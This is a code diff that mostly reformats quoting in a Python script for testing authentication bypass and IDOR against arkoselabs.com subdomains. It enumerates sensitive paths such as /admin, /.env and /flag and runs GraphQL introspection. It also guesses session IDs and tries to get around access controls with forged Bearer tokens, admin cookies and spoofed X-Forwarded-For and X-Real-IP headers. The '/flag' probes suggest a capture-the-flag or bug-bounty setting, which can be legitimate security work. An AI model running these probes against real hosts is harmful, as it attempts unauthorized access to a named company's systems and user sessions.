@@ -1,35 +1,38 @@
 #!/usr/bin/env python3
 """Arkose Labs auth bypass + IDOR testing."""
+
 import json
 import urllib.error
 import urllib.request
 
 
 def get(url, timeout=10, headers=None):
-    h = {'User-Agent': 'Mozilla/5.0'}
+    h = {"User-Agent": "Mozilla/5.0"}
     if headers:
         h.update(headers)
     try:
         req = urllib.request.Request(url, headers=h)
         with urllib.request.urlopen(req, timeout=timeout) as r:
-            return r.getcode(), r.read().decode('utf-8', 'replace'), dict(r.headers)
+            return r.getcode(), r.read().decode("utf-8", "replace"), dict(r.headers)
     except urllib.error.HTTPError as e:
-        return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)
+        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)
     except Exception as e:
         return 0, str(e), {}
 
+
 def post(url, data, timeout=10, headers=None):
-    h = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
+    h = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
     if headers:
         h.update(headers)
     try:
-        req = urllib.request.Request(url, data=json.dumps(data).encode(), headers=h, method='POST')
+        req = urllib.request.Request(url, data=json.dumps(data).encode(), headers=h, method="POST")
         with urllib.request.urlopen(req, timeout=timeout) as r:
-            return r.getcode(), r.read().decode('utf-8', 'replace'), dict(r.headers)
+            return r.getcode(), r.read().decode("utf-8", "replace"), dict(r.headers)
     except urllib.error.HTTPError as e:
-        return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)
+        return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)
     except Exception as e:
         return 0, str(e), {}
+
 
 # ============================================
 # 1. ACCOUNT MANAGEMENT PORTAL
@@ -38,13 +41,13 @@ print("=== ACCOUNT MANAGEMENT PORTAL ===")
 AM = "https://portal-account-mgmt.arkoselabs.com"
 
 # Check endpoints
-for path in ['/', '/login', '/register', '/admin', '/api', '/flag', '/robots.txt', '/.env', '/graphql']:
+for path in ["/", "/login", "/register", "/admin", "/api", "/flag", "/robots.txt", "/.env", "/graphql"]:
     code, body, headers = get(f"{AM}{path}")
     if code != 404:
         print(f"  {path}: {code}")
         if code == 200 and len(body) > 100:
             # Check for interesting content
-            if 'flag' in body.lower() or 'secret' in body.lower():
+            if "flag" in body.lower() or "secret" in body.lower():
                 print(f"    INTERESTING: {body[:200]}")
 
 # Check for GraphQL
@@ -55,7 +58,7 @@ if code == 200:
     print(f"  Schema: {body[:500]}")
 
 # Try introspection with different paths
-for path in ['/graphql', '/api/graphql', '/v1/graphql', '/v2/graphql']:
+for path in ["/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql"]:
     code, body, _ = post(f"{AM}{path}", {"query": "{ __schema { queryType { name } } }"})
     if code == 200:
         print(f"  {path}: {code} - {body[:200]}")
@@ -66,7 +69,7 @@ for path in ['/graphql', '/api/graphql', '/v1/graphql', '/v2/graphql']:
 print("\n=== CUSTOMER SESSIONS ===")
 CS = "https://customer-sessions.arkoselabs.com"
 
-for path in ['/', '/api', '/sessions', '/health', '/flag']:
+for path in ["/", "/api", "/sessions", "/health", "/flag"]:
     code, body, headers = get(f"{CS}{path}")
     if code != 404:
         print(f"  {path}: {code}")
@@ -75,7 +78,7 @@ for path in ['/', '/api', '/sessions', '/health', '/flag']:
 
 # Test IDOR on session IDs
 print("\n  Testing IDOR...")
-for session_id in ['1', '2', '3', 'admin', 'test', 'flag']:
+for session_id in ["1", "2", "3", "admin", "test", "flag"]:
     code, body, _ = get(f"{CS}/api/sessions/{session_id}")
     if code != 404:
         print(f"    /api/sessions/{session_id}: {code}")
@@ -92,13 +95,13 @@ PORTAL = "https://portal.arkoselabs.com"
 print("  Testing /flag endpoint...")
 for headers in [
     {},
-    {'Authorization': 'Bearer test'},
-    {'Authorization': 'Bearer admin'},
-    {'X-Forwarded-For': '127.0.0.1'},
-    {'X-Real-IP': '127.0.0.1'},
-    {'X-Forwarded-Host': 'localhost'},
-    {'Cookie': 'session=admin'},
-    {'Cookie': 'token=admin'},
+    {"Authorization": "Bearer test"},
+    {"Authorization": "Bearer admin"},
+    {"X-Forwarded-For": "127.0.0.1"},
+    {"X-Real-IP": "127.0.0.1"},
+    {"X-Forwarded-Host": "localhost"},
+    {"Cookie": "session=admin"},
+    {"Cookie": "token=admin"},
 ]:
     code, body, _ = get(f"{PORTAL}/flag", headers=headers)
     if code != 403:
@@ -108,16 +111,15 @@ for headers in [
 
 # Test /admin with different methods
 print("\n  Testing /admin endpoint...")
-for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']:
+for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]:
     try:
-        req = urllib.request.Request(f"{PORTAL}/admin", method=method,
-                                     headers={'User-Agent': 'Mozilla/5.0'})
+        req = urllib.request.Request(f"{PORTAL}/admin", method=method, headers={"User-Agent": "Mozilla/5.0"})
         with urllib.request.urlopen(req, timeout=10) as r:
             code = r.getcode()
-            body = r.read().decode('utf-8', 'replace')
+            body = r.read().decode("utf-8", "replace")
     except urllib.error.HTTPError as e:
         code = e.code
-        body = e.read().decode('utf-8', 'replace')
+        body = e.read().decode("utf-8", "replace")
     except Exception as e:
         code = 0
         body = str(e)
@@ -132,7 +134,7 @@ for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']:
 print("\n=== GRAPHQL INJECTION ===")
 
 # Try introspection on main portal
-for path in ['/api', '/api/graphql', '/graphql']:
+for path in ["/api", "/api/graphql", "/graphql"]:
     code, body, _ = post(f"{PORTAL}{path}", {"query": "{ __schema { types { name } } }"})
     if code == 200:
         print(f"  {path}: {code}")
